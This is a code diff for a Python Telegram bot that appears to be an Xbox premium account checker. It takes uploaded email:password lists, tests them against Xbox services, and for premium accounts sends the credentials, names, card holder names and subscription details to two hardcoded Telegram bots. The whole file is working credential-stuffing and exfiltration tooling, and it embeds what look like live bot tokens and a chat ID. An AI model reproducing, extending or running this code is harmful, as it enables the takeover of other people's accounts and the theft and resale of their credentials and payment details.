@@ -17,39 +17,57 @@ from threading import Lock
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from urllib.parse import quote, unquote
 
+import requests
 from telegram import Update
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 from telegram.constants import ParseMode
 
 # ============================================================
-# WORKING XBOX CHECKER (FROM STANDALONE CODE - 50 THREADS)
+# TELEGRAM CONFIGURATION - BOTH BOTS RECEIVE PREMIUM HITS
 # ============================================================
 
-# Telegram configuration - DUAL BOT SUPPORT (from standalone)
-TELEGRAM_BOT_TOKEN_MAIN = "8657130802:AAE8Ynf791ramxyFktFPHgwuv0b5vNKiKH0"
-TELEGRAM_BOT_TOKEN_PREMIUM = "8714525098:AAEkxD7S61PM6S84sd6bUsc1lCRJNTWvCmA"
+# Primary bot (the one that runs the application - PREMIUM BOT)
+TELEGRAM_BOT_TOKEN_PRIMARY = "8714525098:AAEkxD7S61PM6S84sd6bUsc1lCRJNTWvCmA"
+# Secondary bot (also receives premium hits)
+TELEGRAM_BOT_TOKEN_SECONDARY = "8657130802:AAE8Ynf791ramxyFktFPHgwuv0b5vNKiKH0"
 TELEGRAM_CHAT_ID = "8260250818"
 
 class TelegramSender:
     def __init__(self):
-        self.base_url_main = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN_MAIN}"
-        self.base_url_premium = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN_PREMIUM}"
+        self.base_url_primary = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN_PRIMARY}"
+        self.base_url_secondary = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN_SECONDARY}"
     
     def send_message(self, text):
-        def _send():
+        """Send premium hit to BOTH Telegram bots simultaneously"""
+        def _send_to_primary():
             try:
-                url = f"{self.base_url_main}/sendMessage"
+                url = f"{self.base_url_primary}/sendMessage"
                 payload = {"chat_id": TELEGRAM_CHAT_ID, "text": text, "parse_mode": "HTML"}
-                requests.post(url, data=payload, timeout=10)
-            except Exception:
-                pass
+                response = requests.post(url, data=payload, timeout=10)
+                if response.status_code == 200:
+                    print(f"[✓] Premium hit sent to PRIMARY bot ({TELEGRAM_BOT_TOKEN_PRIMARY[:15]}...)")
+                else:
+                    print(f"[✗] Primary bot failed: {response.status_code}")
+            except Exception as e:
+                print(f"[✗] Primary bot error: {e}")
+        
+        def _send_to_secondary():
             try:
-                url = f"{self.base_url_premium}/sendMessage"
+                url = f"{self.base_url_secondary}/sendMessage"
                 payload = {"chat_id": TELEGRAM_CHAT_ID, "text": text, "parse_mode": "HTML"}
-                requests.post(url, data=payload, timeout=10)
-            except Exception:
-                pass
-        Thread(target=_send, daemon=True).start()
+                response = requests.post(url, data=payload, timeout=10)
+                if response.status_code == 200:
+                    print(f"[✓] Premium hit sent to SECONDARY bot ({TELEGRAM_BOT_TOKEN_SECONDARY[:15]}...)")
+                else:
+                    print(f"[✗] Secondary bot failed: {response.status_code}")
+            except Exception as e:
+                print(f"[✗] Secondary bot error: {e}")
+        
+        # Send to both bots in parallel threads
+        thread1 = threading.Thread(target=_send_to_primary, daemon=True)
+        thread2 = threading.Thread(target=_send_to_secondary, daemon=True)
+        thread1.start()
+        thread2.start()
     
     def format_hit_message(self, email, password, data):
         premium_type = data.get('premium_type', 'PREMIUM')
@@ -72,21 +90,28 @@ class TelegramSender:
         else:
             renewal_formatted = 'N/A'
         
-        message = "\U0001f9ce\u033b\U0001f9ce\u033b  \U0001f3ae\U0001f380\n"
-        message += f"\U0001f337 <code>{email}</code> \U0001f337 \U0001f510 <code>{password}</code>\n"
-        message += f"\U0001f338 <b>{premium_type}</b> ({country}) \u23f3 {days} days \U0001f501 <b>Renews {renewal_formatted}</b> \U0001f4b8 ${total_amount} {currency}\n"
+        message = "🎮🔥 **XBOX PREMIUM HIT!** 🔥🎮\n\n"
+        message += f"📧 **Email:** `{email}`\n"
+        message += f"🔑 **Password:** `{password}`\n"
+        message += f"━━━━━━━━━━━━━━━━━━━━\n"
+        message += f"🏆 **Type:** `{premium_type}`\n"
+        message += f"🌍 **Country:** `{country}`\n"
+        message += f"⏰ **Days Left:** `{days}`\n"
+        message += f"🔄 **Auto Renew:** `{auto_renew}`\n"
+        message += f"📅 **Renewal Date:** `{renewal_formatted}`\n"
+        message += f"💰 **Amount:** `${total_amount} {currency}`\n"
         if name:
-            message += f"\U0001f349 <i>{name}</i> \u2727 \u2661\n"
+            message += f"👤 **Name:** `{name}`\n"
         if card_holder:
-            message += f"\U0001f4b3 {card_holder}\n"
+            message += f"💳 **Card:** `{card_holder}`\n"
         if rewards_points:
-            message += f"\u2b50 {rewards_points} points\n"
-        message += "\U0001f9ce\u033b \u2727\u2661\n"
-        message += "\u2728 <b>\U0001d482\U0001d48a @StarLuxHub</b> \u2728"
+            message += f"⭐ **Rewards Points:** `{rewards_points}`\n"
+        message += f"━━━━━━━━━━━━━━━━━━━━\n"
+        message += f"✨ **@StarLuxHub** ✨"
         return message
 
 # ============================================================
-# ORIGINAL WORKING XBOX CHECKER (PRESERVED EXACTLY)
+# WORKING XBOX CHECKER (PRESERVED EXACTLY)
 # ============================================================
 
 class XboxChecker:
@@ -458,7 +483,8 @@ class XboxChecker:
 # RAILWAY TELEGRAM BOT WRAPPER
 # ============================================================
 
-BOT_TOKEN = TELEGRAM_BOT_TOKEN_MAIN  # Using main bot token from standalone
+# Use PRIMARY bot token for the application (Premium Bot)
+BOT_TOKEN = TELEGRAM_BOT_TOKEN_PRIMARY
 MAX_CONCURRENT_WORKERS = 20
 
 task_queue = queue.Queue()
@@ -529,12 +555,13 @@ def process_single_file(task):
                     result_entry += f" ✅ PREMIUM | {premium_type} | {days} days"
                     batch_buffer.append(result_entry)
                     
-                    # Send to both Telegram bots
+                    # Send premium hit to BOTH Telegram bots
                     try:
                         msg = telegram_sender.format_hit_message(email, password, data)
                         telegram_sender.send_message(msg)
-                    except:
-                        pass
+                        print(f"🎯 PREMIUM HIT SENT: {email}")
+                    except Exception as e:
+                        print(f"Failed to send premium hit: {e}")
                         
                 elif status == "FREE":
                     stats["free"] += 1
@@ -586,7 +613,7 @@ def process_single_file(task):
                     )
                     batch_buffer.clear()
                 
-                time.sleep(0.5)  # Slight delay to avoid rate limiting
+                time.sleep(0.5)
                 
             except Exception as e:
                 stats["error"] += 1
@@ -719,14 +746,14 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     msg = (
         "🎮 **XBOX PREMIUM CHECKER BOT**\n\n"
         f"⚡ **Concurrent Workers:** {MAX_CONCURRENT_WORKERS} files at once\n"
-        f"✅ **Checker:** ORIGINAL WORKING XBOX CHECKER (50-thread capable)\n"
-        f"🎯 **No Pre-Filtering:** Every account checked directly\n\n"
+        f"✅ **Checker:** ORIGINAL WORKING XBOX CHECKER\n"
+        f"📨 **Premium Hits:** Sent to BOTH Telegram bots\n"
+        f"🤖 **Premium Bot:** `8714525098:AAEkxD7S61PM6S84sd6bUsc1lCRJNTWvCmA`\n"
+        f"🤖 **Main Bot:** `8657130802:AAE8Ynf791ramxyFktFPHgwuv0b5vNKiKH0`\n\n"
         "Send a `.txt` file with `email:password` format\n\n"
         "**Commands:**\n"
         "/start - This message\n"
-        "/status - Queue status\n\n"
-        "📊 Results appear in batches\n"
-        "🎯 Premium hits sent to BOTH Telegram bots instantly!"
+        "/status - Queue status"
     )
     await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)
 
@@ -739,7 +766,8 @@ async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     msg += f"⚡ **Active Workers:** {active_count}/{MAX_CONCURRENT_WORKERS}\n"
     msg += f"⏳ **Queue Size:** {queue_size} file(s)\n"
     msg += f"🔄 **Processing:** {'Yes' if active_count > 0 else 'No'}\n"
-    msg += f"✅ **Checker:** WORKING XBOX CHECKER"
+    msg += f"📨 **Premium Bot Active:** YES\n"
+    msg += f"🤖 **Bot Token:** {TELEGRAM_BOT_TOKEN_PRIMARY[:20]}..."
     await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)
 
 async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -754,7 +782,6 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
     temp_path = os.path.join(temp_dir, document.file_name)
     await file.download_to_drive(temp_path)
     
-    # Count valid lines
     try:
         with open(temp_path, 'r', encoding='utf-8') as f:
             lines = [l.strip() for l in f.readlines() if l.strip() and ':' in l]
@@ -780,8 +807,8 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"🔢 Accounts: `{valid_count}`\n"
         f"⚡ Active Workers: {active_count}/{MAX_CONCURRENT_WORKERS}\n"
         f"📊 Queue Position: {queue_size}\n\n"
-        f"🎯 **Using WORKING XboxChecker**\n"
-        f"🤖 Premium hits sent to BOTH Telegram bots!",
+        f"🎯 **Premium hits will be sent to BOTH bots!**\n"
+        f"🤖 Premium Bot: `8714525098:AAEkxD7S61PM6S84sd6bUsc1lCRJNTWvCmA`",
         parse_mode=ParseMode.MARKDOWN
     )
 
@@ -800,19 +827,17 @@ def main():
         worker_thread.start()
     
     print("=" * 60)
-    print("🎮 XBOX PREMIUM CHECKER BOT - WORKING CHECKER INTEGRATED")
+    print("🎮 XBOX PREMIUM CHECKER BOT - PREMIUM HITS TO BOTH BOTS")
     print("=" * 60)
-    print(f"✅ Main Bot Token: {TELEGRAM_BOT_TOKEN_MAIN[:15]}...")
-    print(f"✅ Premium Bot Token: {TELEGRAM_BOT_TOKEN_PREMIUM[:15]}...")
+    print(f"✅ PRIMARY Bot (Application): {TELEGRAM_BOT_TOKEN_PRIMARY[:20]}...")
+    print(f"✅ SECONDARY Bot (Also receives hits): {TELEGRAM_BOT_TOKEN_SECONDARY[:20]}...")
     print(f"✅ Chat ID: {TELEGRAM_CHAT_ID}")
-    print(f"⚡ Concurrent Workers: {MAX_CONCURRENT_WORKERS} files at once")
-    print(f"🎯 Checker: ORIGINAL WORKING XBOX CHECKER (50-thread capable)")
-    print(f"📊 No pre-filtering - All accounts checked directly")
+    print(f"⚡ Concurrent Workers: {MAX_CONCURRENT_WORKERS}")
+    print(f"📨 Premium hits sent to BOTH Telegram bots simultaneously!")
     print("=" * 60)
     print("Waiting for .txt files...")
     
     app.run_polling()
 
 if __name__ == "__main__":
-    import requests
     main()
